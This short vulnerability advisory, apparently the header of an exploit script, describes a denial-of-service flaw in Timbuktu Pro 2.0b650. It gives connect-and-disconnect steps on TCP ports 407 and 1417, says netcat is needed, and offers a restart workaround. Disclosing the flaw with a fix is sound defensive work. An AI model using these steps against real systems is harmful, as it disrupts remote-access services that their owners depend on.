Simple connections and disconnections to Timbuktu ports can hang the authentication process and halt all Timbuktu services. To return to normal functionality, the Timbuktu process will need to be killed and the Timbuktu service is required to be stopped and restarted.

# *Needs netcat in order to work......*
# Immune systems:
# Timbuktu Pro 2000
#
# Vulnerable systems:
# Timbuktu Pro 2.0b650 (Also incorrectly known as Timbukto)
#
# Exploit:
#  - Connect and disconnect to port TCP/407 and port TCP/1417 will start

# listening.
#  - Connect on port TCP/1417 (using a simple telnet client).
#  - Disconnect from TCP/1417 (with no data exchange).
#
# Workaround:
# - Kill Timbuktu process (using pslist/pskill for example).
# - Stop Timbuktu services.
# - Start them again.
